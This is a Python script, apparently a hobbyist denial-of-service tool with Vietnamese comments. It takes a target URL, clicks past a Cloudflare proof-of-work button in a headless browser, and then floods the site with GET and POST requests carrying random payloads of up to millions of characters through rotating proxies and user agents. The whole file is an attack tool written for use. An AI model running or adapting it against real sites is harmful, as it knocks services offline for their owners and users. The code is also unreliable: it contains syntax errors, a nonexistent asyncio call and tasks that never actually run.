import pyppeteer
import asyncio
import requests
import random
import string
import ssl
import sys
import concurrent.futures
import aiohttp

def generate_random_payload():
    length = random.randint(1, 9999999)
    text_characters = string.ascii_letters + string.digits + string.punctuation
    payload = "".join(random.choice(text_characters) for i in range(length))
    return payload

async def bypass_cloudflare(page):
    cloudflare_button = await page.evaluate('() => {
        const button = document.querySelector(".big-button.pow-button");
        if(button) {
            const { x, y, width, height } = button.getBoundingClientRect();
            return { x: x + width / 2, y: y + height / 2 };
        } else {
            return false;
        }
    }')

    if cloudflare_button:
        await page.hover('.big-button.pow-button')
        await page.mouse.click(cloudflare_button['x'], cloudflare_button['y'])
        await page.waitForTimeout(6000)

async def attack(url, user_agent, proxy):
    print("Waiting for web check...")
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": user_agent,
    }
    proxies = {
        'http': proxy,
    }

    while True:
        try:
            x = requests.get(url, headers=headers, params={"payload": generate_random_payload()}, proxies=proxies, timeout=3)
            print("Proxy IP:", proxy)  # In ra IP proxy gửi
            print("Response:", x.text)  # In ra response của trang web
            print("Status:", x.status_code)  # In ra status của trang web

        except requests.exceptions.RequestException as e:
            print("Error:", e)

        if x is not None and x.status_code == 200:
            session = aiohttp.ClientSession()
            context = ssl.create_default_context()
            async with session.head(url, cookies=x.cookies, ssl=context) as response:
                await response.text()
            test = requests.get(url)
            print("test", test.status_code)
            await asyncio.sleep(0.1)
            requests.post(url, headers=headers, data={"payload": generate_random_payload()})
            rsn = requests.get(url)
            print("status web", rsn)
        elif x is not None and x.status_code == 403:
            print("Blocked by Cloudflare! Exit...")
            break
        elif x is not None and x.status_code >= 500:
            print("False back!!!, attacking again")
            session = aiohttp.ClientSession()
            async with session.get(url, proxy=proxy) as response:
                await response.text()
        session.close()

        if sys.stdin in asyncio.select([sys.stdin], [], [], 0)[0]:
            break

async def create_syn_connection(proxy):
    loop = asyncio.get_event_loop()
    transport, protocol = await loop.create_connection(asyncio.Protocol, host='127.0.0.1', port=0, ssl=False, local_addr=(proxy.split(":")[0], int(proxy.split(":")[1])))
    await asyncio.sleep(6)
    transport.close()

async def main():
	print("\033[92m===================\n|| \033[91mdos \033[94msiêu \033[91mlỏ, \033[0mviết bởi dragoo ||\n\033[92m===================\033[0m\n\n")
    url = input("URL: ")
    num_threads = int(input("Number of threads: "))

    # Lấy danh sách user agent từ file ua.txt
    with open("ua.txt", "r") as file:
        user_agents = file.read().splitlines()

    # Lấy danh sách proxy từ file proxy.txt hoặc mặc định là proxy.txt nếu không có
    proxy_file = input("Proxy file (proxy.txt): ").strip()
    if not proxy_file:
        proxy_file = "proxy.txt"
    with open(proxy_file, "r") as file:
        proxies = file.read().splitlines()

    # Tạo một trình duyệt mới
    browser = await pyppeteer.launch()
    page = await browser.newPage()

    # Điều hướng đến url
    await page.goto(url)

    # Bypass Cloudflare
    await bypass_cloudflare(page)

    # Đợi để chắc chắn Cloudflare đã được bypass thành công
    await asyncio.sleep(3)

    # Chạy công việc tạo kết nối SYN
    async def create_syn_task(proxy):
        await create_syn_connection(proxy)

    # Chạy công việc tấn công với đa luồng
    async def attack_task(user_agent, proxy):
        await attack(url, user_agent, proxy)
    
    # Sử dụng Executor để thực hiện đa luồng
    with concurrent.futures.ThreadPoolExecutor() as executor:
        loop = asyncio.get_event_loop()

        # Tạo danh sách công việc cần thực hiện trong đa luồng
        tasks = []
        for proxy in proxies:
            tasks.append(loop.run_in_executor(executor, create_syn_task, proxy))
        for _ in range(num_threads):
            user_agent = random.choice(user_agents)
            proxy = random.choice(proxies)
            tasks.append(loop.run_in_executor(executor, attack_task, user_agent, proxy))

        # Chờ cho tất cả các công việc hoàn thành
        await asyncio.wait(tasks)

    # Đóng trình duyệt
    await browser.close()

# Chạy chương trình chính trong một event loop
loop = asyncio.get_event_loop()
loop.run_until_complete(main())
loop.close()